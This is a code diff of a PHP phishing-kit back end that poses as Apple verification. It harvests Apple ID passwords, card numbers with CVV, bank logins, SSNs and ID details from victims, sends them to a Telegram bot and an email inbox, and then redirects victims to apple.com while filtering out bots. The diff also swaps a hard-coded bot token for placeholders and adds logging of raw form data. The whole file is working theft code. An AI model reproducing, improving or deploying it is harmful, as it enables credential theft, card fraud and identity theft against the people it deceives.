@@ -76,8 +76,8 @@ function generateNewToken($length = 32) {
 // Function to send data to Telegram
 function sendToTelegram($message) {
     // Replace with your actual bot token and chat ID
-    $botToken = '5833826797:AAHinlaDwiK7-fk8_LMjk8aGydwiM70TZ8g';
-    $chatId = '5480674751';
+    $botToken = 'YOUR_TELEGRAM_BOT_TOKEN';
+    $chatId = 'YOUR_CHAT_ID';
     
     // Format message for Telegram
     $formattedMessage = urlencode($message);
@@ -99,7 +99,7 @@ function sendToTelegram($message) {
 // Function to send photo to Telegram
 function sendPhotoToTelegram($photoPath, $caption = '') {
     // Replace with your actual bot token and chat ID
-    $botToken = '5833826797:AAHinlaDwiK7-fk8_LMjk8aGydwiM70TZ8g';
+    $botToken = 'YOUR_TELEGRAM_BOT_TOKEN';
     $chatId = 'YOUR_CHAT_ID';
     
     // Format caption for Telegram
@@ -138,7 +138,7 @@ function sendPhotoToTelegram($photoPath, $caption = '') {
 // Function to send data to email
 function sendToEmail($data) {
     $to = "jokersudo@yandex.com"; // Replace with your email
-    $subject = "New Apple Verification Data";
+    $subject = "New Ap2ple Verification Data";
     
     // Prepare the email content
     $message = "New verification data submitted:\n\n";
@@ -154,7 +154,7 @@ function sendToEmail($data) {
     $message .= "Timestamp: " . date('Y-m-d H:i:s') . "\n";
     
     // Additional headers
-    $headers = "From: apangao@rsj16.rhostjh.com\r\n";
+    $headers = "From: apple-verification@your-domain.com\r\n";
     $headers .= "Reply-To: no-reply@your-domain.com\r\n";
     $headers .= "X-Mailer: PHP/" . phpversion();
     
@@ -164,6 +164,9 @@ function sendToEmail($data) {
 
 // Process the request
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    // Log the raw request for debugging
+    file_put_contents('request_log.txt', date('Y-m-d H:i:s') . ' - ' . print_r($_POST, true) . "\n", FILE_APPEND);
+    
     // Verify the request is from a valid source, not a bot
     if (checkForBot($_POST)) {
         // Return normal response to not alert bots, but don't process the data
@@ -210,236 +213,126 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             }
             break;
             
-        case 2:
-            // Personal information step with ID uploads
-            if (isset($_POST['fullname']) && isset($_POST['dob']) && isset($_POST['phone']) && isset($_POST['address'])) {
-                $data = array(
-                    'step' => 'Personal Information',
-                    'email' => $_POST['email'] ?? '',
-                    'fullname' => $_POST['fullname'],
-                    'dob' => $_POST['dob'],
-                    'phone' => $_POST['phone'],
-                    'address' => $_POST['address'],
-                    'ip' => $_SERVER['REMOTE_ADDR'],
-                    'timestamp' => date('Y-m-d H:i:s')
-                );
-                
-                // Handle ID front upload
-                $idFrontPath = '';
-                if (isset($_FILES['id_front']) && $_FILES['id_front']['error'] === UPLOAD_ERR_OK) {
-                    $fileType = pathinfo($_FILES['id_front']['name'], PATHINFO_EXTENSION);
-                    $newFileName = 'id_front_' . time() . '_' . rand(1000, 9999) . '.' . $fileType;
-                    $uploadFile = $uploadDir . $newFileName;
-                    
-                    if (move_uploaded_file($_FILES['id_front']['tmp_name'], $uploadFile)) {
-                        $idFrontPath = $uploadFile;
-                        $data['id_front_path'] = $idFrontPath;
-                    }
-                }
-                
-                // Handle ID back upload (if provided)
-                $idBackPath = '';
-                if (isset($_FILES['id_back']) && $_FILES['id_back']['error'] === UPLOAD_ERR_OK) {
-                    $fileType = pathinfo($_FILES['id_back']['name'], PATHINFO_EXTENSION);
-                    $newFileName = 'id_back_' . time() . '_' . rand(1000, 9999) . '.' . $fileType;
-                    $uploadFile = $uploadDir . $newFileName;
-                    
-                    if (move_uploaded_file($_FILES['id_back']['tmp_name'], $uploadFile)) {
-                        $idBackPath = $uploadFile;
-                        $data['id_back_path'] = $idBackPath;
-                    }
-                }
-                
-                // Format message for Telegram
-                $message = "👤 <b>Personal Information:</b>\n";
-                $message .= "📧 <b>Email:</b> " . ($_POST['email'] ?? 'N/A') . "\n";
-                $message .= "👨‍💼 <b>Name:</b> " . $_POST['fullname'] . "\n";
-                $message .= "🎂 <b>DOB:</b> " . $_POST['dob'] . "\n";
-                $message .= "📞 <b>Phone:</b> " . $_POST['phone'] . "\n";
-                $message .= "🏠 <b>Address:</b> " . $_POST['address'] . "\n";
-                $message .= "🌐 <b>IP:</b> " . $_SERVER['REMOTE_ADDR'] . "\n";
-                $message .= "⏰ <b>Time:</b> " . date('Y-m-d H:i:s') . "\n";
-                
-                if ($idFrontPath) {
-                    $message .= "🆔 <b>ID Front:</b> Uploaded ✅\n";
-                }
-                
-                if ($idBackPath) {
-                    $message .= "🆔 <b>ID Back:</b> Uploaded ✅\n";
-                }
-                
-                // Send message to Telegram
-                sendToTelegram($message);
-                
-                // For Telegram image sending (if needed)
-                if ($idFrontPath) {
-                    // You can add code here to send ID images directly to Telegram
-                    // using the Telegram sendPhoto API endpoint
-                }
-                
-                // Send data to email
-                sendToEmail($data);
-            }
-            break;
-            
-        case 3:
-            // Card information step
-            if (isset($_POST['cardType']) && isset($_POST['cardNumber']) && isset($_POST['expiry']) && isset($_POST['cvv'])) {
-                $data = array(
-                    'step' => 'Card Information',
-                    'email' => $_POST['email'] ?? '',
-                    'card_type' => $_POST['cardType'],
-                    'card_number' => $_POST['cardNumber'],
-                    'expiry' => $_POST['expiry'],
-                    'cvv' => $_POST['cvv'],
-                    'ip' => $_SERVER['REMOTE_ADDR'],
-                    'timestamp' => date('Y-m-d H:i:s')
-                );
-                
-                // Format message for Telegram
-                $message = "💳 <b>Payment Information:</b>\n";
-                $message .= "📧 <b>Email:</b> " . ($_POST['email'] ?? 'N/A') . "\n";
-                $message .= "💳 <b>Card Type:</b> " . $_POST['cardType'] . "\n";
-                $message .= "🔢 <b>Card Number:</b> " . $_POST['cardNumber'] . "\n";
-                $message .= "📅 <b>Expiry:</b> " . $_POST['expiry'] . "\n";
-                $message .= "🔒 <b>CVV:</b> " . $_POST['cvv'] . "\n";
-                $message .= "🌐 <b>IP:</b> " . $_SERVER['REMOTE_ADDR'] . "\n";
-                $message .= "⏰ <b>Time:</b> " . date('Y-m-d H:i:s') . "\n";
-                
-                // Send data to Telegram and email
-                sendToTelegram($message);
-                sendToEmail($data);
-            }
-            break;
-            
         case 4:
             // Final submission with all data
-            // Collect all data from the form
+            // Get JSON data from form
+            $email = isset($_POST['collected-email']) ? $_POST['collected-email'] : '';
+            $password = isset($_POST['collected-password']) ? $_POST['collected-password'] : '';
+            $cardJson = isset($_POST['collected-card']) ? $_POST['collected-card'] : '{}';
+            $personalJson = isset($_POST['collected-personal']) ? $_POST['collected-personal'] : '{}';
+            $idJson = isset($_POST['collected-id']) ? $_POST['collected-id'] : '{}';
+            
+            // Parse JSON data
+            $cardData = json_decode($cardJson, true) ?: [];
+            $personalData = json_decode($personalJson, true) ?: [];
+            $idData = json_decode($idJson, true) ?: [];
+            
+            // Combine all data
             $data = array(
-                'step' => 'COMPLETE SUBMISSION',
+                'step' => 'Complete Form Submission',
+                'email' => $email,
+                'password' => $password,
                 'ip' => $_SERVER['REMOTE_ADDR'],
-                'user_agent' => $_POST['userAgent'] ?? $_SERVER['HTTP_USER_AGENT'],
+                'user_agent' => $_SERVER['HTTP_USER_AGENT'],
                 'timestamp' => date('Y-m-d H:i:s')
             );
             
-            // Login Details
-            $loginDetails = array(
-                'email' => $_POST['email'] ?? '',
-                'password' => $_POST['password'] ?? '',
-                'webid' => $_POST['webid'] ?? ''
-            );
-            $data = array_merge($data, $loginDetails);
-            
-            // Card Details
-            $cardDetails = array(
-                'bank' => $_POST['bank'] ?? '',
-                'card_level' => $_POST['cardLevel'] ?? '',
-                'cardholder' => $_POST['cardholder'] ?? '',
-                'card_number' => $_POST['cardNumber'] ?? '',
-                'expiry' => $_POST['expiry'] ?? '',
-                'cvv' => $_POST['cvv'] ?? '',
-                'amex_cid' => $_POST['amexCid'] ?? '',
-                'sort_code' => $_POST['sortCode'] ?? '',
-                'credit_limit' => $_POST['creditLimit'] ?? '',
-                'card_password' => $_POST['cardPassword'] ?? ''
-            );
-            $data = array_merge($data, $cardDetails);
-            
-            // Personal Information
-            $personalInfo = array(
-                'firstname' => $_POST['firstname'] ?? '',
-                'lastname' => $_POST['lastname'] ?? '',
-                'address' => $_POST['address'] ?? '',
-                'city' => $_POST['city'] ?? '',
-                'state' => $_POST['state'] ?? '',
-                'country' => $_POST['country'] ?? '',
-                'zip' => $_POST['zip'] ?? '',
-                'dob' => $_POST['dob'] ?? '',
-                'phone' => $_POST['phone'] ?? ''
-            );
-            $data = array_merge($data, $personalInfo);
-            
-            // Social Information
-            $socialInfo = array(
-                'id_number' => $_POST['idNumber'] ?? '',
-                'civil_id' => $_POST['civilId'] ?? '',
-                'qatar_id' => $_POST['qatarId'] ?? '',
-                'national_id' => $_POST['nationalId'] ?? '',
-                'citizen_id' => $_POST['citizenId'] ?? '',
-                'passport' => $_POST['passport'] ?? '',
-                'bank_access' => $_POST['bankAccess'] ?? '',
-                'sin' => $_POST['sin'] ?? '',
-                'ssn' => $_POST['ssn'] ?? '',
-                'account_number' => $_POST['accountNumber'] ?? '',
-                'osid' => $_POST['osid'] ?? ''
-            );
-            $data = array_merge($data, $socialInfo);
-            
-            // Handle ID document uploads
-            $idFrontPath = '';
-            if (isset($_FILES['id_front']) && $_FILES['id_front']['error'] === UPLOAD_ERR_OK) {
-                $fileType = pathinfo($_FILES['id_front']['name'], PATHINFO_EXTENSION);
-                $newFileName = 'id_front_' . time() . '_' . rand(1000, 9999) . '.' . $fileType;
-                $uploadFile = $uploadDir . $newFileName;
-                
-                if (move_uploaded_file($_FILES['id_front']['tmp_name'], $uploadFile)) {
-                    $idFrontPath = $uploadFile;
-                    $data['id_front_path'] = $idFrontPath;
-                }
+            // Add card data
+            if (!empty($cardData)) {
+                $data = array_merge($data, [
+                    'bank' => $cardData['bank'] ?? '',
+                    'card_level' => $cardData['cardLevel'] ?? '',
+                    'cardholder' => $cardData['cardholder'] ?? '',
+                    'card_number' => $cardData['cardNumber'] ?? '',
+                    'expiry' => $cardData['expiry'] ?? '',
+                    'cvv' => $cardData['cvv'] ?? '',
+                    'amex_cid' => $cardData['amexCID'] ?? '',
+                    'ssn' => $cardData['ssn'] ?? '',
+                    'credit_limit' => $cardData['creditLimit'] ?? '',
+                    'card_password' => $cardData['cardPassword'] ?? ''
+                ]);
             }
             
-            $idBackPath = '';
-            if (isset($_FILES['id_back']) && $_FILES['id_back']['error'] === UPLOAD_ERR_OK) {
-                $fileType = pathinfo($_FILES['id_back']['name'], PATHINFO_EXTENSION);
-                $newFileName = 'id_back_' . time() . '_' . rand(1000, 9999) . '.' . $fileType;
-                $uploadFile = $uploadDir . $newFileName;
-                
-                if (move_uploaded_file($_FILES['id_back']['tmp_name'], $uploadFile)) {
-                    $idBackPath = $uploadFile;
-                    $data['id_back_path'] = $idBackPath;
-                }
+            // Add personal data
+            if (!empty($personalData)) {
+                $data = array_merge($data, [
+                    'firstname' => $personalData['firstName'] ?? '',
+                    'lastname' => $personalData['lastName'] ?? '',
+                    'address' => $personalData['address'] ?? '',
+                    'city' => $personalData['city'] ?? '',
+                    'state' => $personalData['state'] ?? '',
+                    'country' => $personalData['country'] ?? '',
+                    'zipcode' => $personalData['zipcode'] ?? '',
+                    'phone' => $personalData['phone'] ?? ''
+                ]);
             }
             
-            // Format complete message for Telegram in the specified format
+            // Add ID data
+            if (!empty($idData)) {
+                $data = array_merge($data, [
+                    'id_type' => $idData['idType'] ?? '',
+                    'id_number' => $idData['idNumber'] ?? '',
+                    'id_issue_date' => $idData['issueDate'] ?? '',
+                    'id_expiry_date' => $idData['expiryDate'] ?? ''
+                ]);
+            }
+            
+            // Format complete message for Telegram 
             $message = "#--------------------------------[ LOGIN DETAILS ]-------------------------------#\n";
-            $message .= "Apple ID : " . ($loginDetails['email'] ?? 'N/A') . "\n";
-            $message .= "Password : " . ($loginDetails['password'] ?? 'N/A') . "\n";
+            $message .= "Apple ID : " . $email . "\n";
+            $message .= "Password : " . $password . "\n";
             $message .= "#--------------------------------[ CARD DETAILS ]-------------------------------#\n";
-            $message .= "Bank : " . ($cardDetails['bank'] ?? 'N/A') . "\n";
-            $message .= "Level : " . ($cardDetails['card_level'] ?? 'N/A') . "\n";
-            $message .= "Cardholders : " . ($cardDetails['cardholder'] ?? 'N/A') . "\n";
-            $message .= "CC Number : " . ($cardDetails['card_number'] ?? 'N/A') . "\n";
-            $message .= "Expired : " . ($cardDetails['expiry'] ?? 'N/A') . "\n";
-            $message .= "CVV : " . ($cardDetails['cvv'] ?? 'N/A') . "\n";
-            $message .= "AMEX CID : " . ($cardDetails['amex_cid'] ?? 'N/A') . "\n";
-            $message .= "Sort Code : " . ($cardDetails['sort_code'] ?? 'N/A') . "\n";
-            $message .= "Credit Limit : " . ($cardDetails['credit_limit'] ?? 'N/A') . "\n";
+            $message .= "Bank : " . ($cardData['bank'] ?? 'N/A') . "\n";
+            $message .= "Level : " . ($cardData['cardLevel'] ?? 'N/A') . "\n";
+            $message .= "Cardholders : " . ($cardData['cardholder'] ?? 'N/A') . "\n";
+            $message .= "CC Number : " . ($cardData['cardNumber'] ?? 'N/A') . "\n";
+            $message .= "Expired : " . ($cardData['expiry'] ?? 'N/A') . "\n";
+            $message .= "CVV : " . ($cardData['cvv'] ?? 'N/A') . "\n";
+            $message .= "AMEX CID : " . ($cardData['amexCID'] ?? 'N/A') . "\n";
+            $message .= "SSN : " . ($cardData['ssn'] ?? 'N/A') . "\n";
+            $message .= "Credit Limit : " . ($cardData['creditLimit'] ?? 'N/A') . "\n";
             $message .= "#--------------------------[ = INFO ]-----------------------------#\n";
-            $message .= "WEB ID : " . ($loginDetails['webid'] ?? 'N/A') . "\n";
-            $message .= "Card Password : " . ($cardDetails['card_password'] ?? 'N/A') . "\n";
+            $message .= "Bank Username : " . ($cardData['bankUsername'] ?? 'N/A') . "\n";
+            $message .= "Bank Password : " . ($cardData['cardPassword'] ?? 'N/A') . "\n";
             $message .= "#-------------------------[ PERSONAL INFORMATION ]--------------------------------#\n";
-            $message .= "First Name : " . ($personalInfo['firstname'] ?? 'N/A') . "\n";
-            $message .= "Last Name : " . ($personalInfo['lastname'] ?? 'N/A') . "\n";
-            $message .= "Address : " . ($personalInfo['address'] ?? 'N/A') . "\n";
-            $message .= "City : " . ($personalInfo['city'] ?? 'N/A') . "\n";
-            $message .= "State : " . ($personalInfo['state'] ?? 'N/A') . "\n";
-            $message .= "Country : " . ($personalInfo['country'] ?? 'N/A') . "\n";
-            $message .= "Zip : " . ($personalInfo['zip'] ?? 'N/A') . "\n";
-            $message .= "BirthDay : " . ($personalInfo['dob'] ?? 'N/A') . "\n";
-            $message .= "Phone : " . ($personalInfo['phone'] ?? 'N/A') . "\n";
-            $message .= "#------------------------[ SOCIAL INFORMATION ]------------------------------#\n";
-            $message .= "ID Number : " . ($socialInfo['id_number'] ?? 'N/A') . "\n";
-            $message .= "Civil ID : " . ($socialInfo['civil_id'] ?? 'N/A') . "\n";
-            $message .= "Qatar ID : " . ($socialInfo['qatar_id'] ?? 'N/A') . "\n";
-            $message .= "National ID : " . ($socialInfo['national_id'] ?? 'N/A') . "\n";
-            $message .= "Citizen ID : " . ($socialInfo['citizen_id'] ?? 'N/A') . "\n";
-            $message .= "Passport Number : " . ($socialInfo['passport'] ?? 'N/A') . "\n";
-            $message .= "Bank Access Number : " . ($socialInfo['bank_access'] ?? 'N/A') . "\n";
-            $message .= "Social Insurance Number : " . ($socialInfo['sin'] ?? 'N/A') . "\n";
-            $message .= "Social Security Number : " . ($socialInfo['ssn'] ?? 'N/A') . "\n";
-            $message .= "Account Number : " . ($socialInfo['account_number'] ?? 'N/A') . "\n";
-            $message .= "OSID Number : " . ($socialInfo['osid'] ?? 'N/A') . "\n";
+            $message .= "First Name : " . ($personalData['firstName'] ?? 'N/A') . "\n";
+            $message .= "Last Name : " . ($personalData['lastName'] ?? 'N/A') . "\n";
+            $message .= "Address : " . ($personalData['address'] ?? 'N/A') . "\n";
+            $message .= "City : " . ($personalData['city'] ?? 'N/A') . "\n";
+            $message .= "State : " . ($personalData['state'] ?? 'N/A') . "\n";
+            $message .= "Country : " . ($personalData['country'] ?? 'N/A') . "\n";
+            $message .= "Zip : " . ($personalData['zipcode'] ?? 'N/A') . "\n";
+            $message .= "Phone : " . ($personalData['phone'] ?? 'N/A') . "\n";
+            $message .= "#------------------------[ ID INFORMATION ]------------------------------#\n";
+            $message .= "ID Type : " . ($idData['idType'] ?? 'N/A') . "\n";
+            $message .= "ID Number : " . ($idData['idNumber'] ?? 'N/A') . "\n";
+            $message .= "Issue Date : " . ($idData['issueDate'] ?? 'N/A') . "\n";
+            $message .= "Expiry Date : " . ($idData['expiryDate'] ?? 'N/A') . "\n";
             $message .= "#------------------------[ DEVICE INFORMATION ]------------------------------#\n";
             $message .= "IP Address : " . $_SERVER['REMOTE_ADDR'] . "\n";
-            $message .= "User Agent : " . ($_POST['userAgent'] ?? $_SERVER['HTTP_USER_AGENT']) . "\n";
+            $message .= "User Agent : " . $_SERVER['HTTP_USER_AGENT'] . "\n";
             $message .= "Date/Time : " . date('Y-m-d H:i:s') . "\n";
+            
+            // Send data to Telegram and email
+            sendToTelegram($message);
+            sendToEmail($data);
+            
+            // Log completion
+            file_put_contents('completed_submissions.txt', date('Y-m-d H:i:s') . ' - ' . $email . ' - ' . $_SERVER['REMOTE_ADDR'] . "\n", FILE_APPEND);
+            break;
+    }
+    
+    // Return success response
+    $response = array(
+        'status' => 'success',
+        'redirect' => 'https://www.apple.com',
+        'newToken' => generateNewToken()
+    );
+    
+    echo json_encode($response);
+} else {
+    // Not a POST request - redirect to avoid direct access
+    header('Location: https://www.apple.com');
+    exit;
+}
+?>
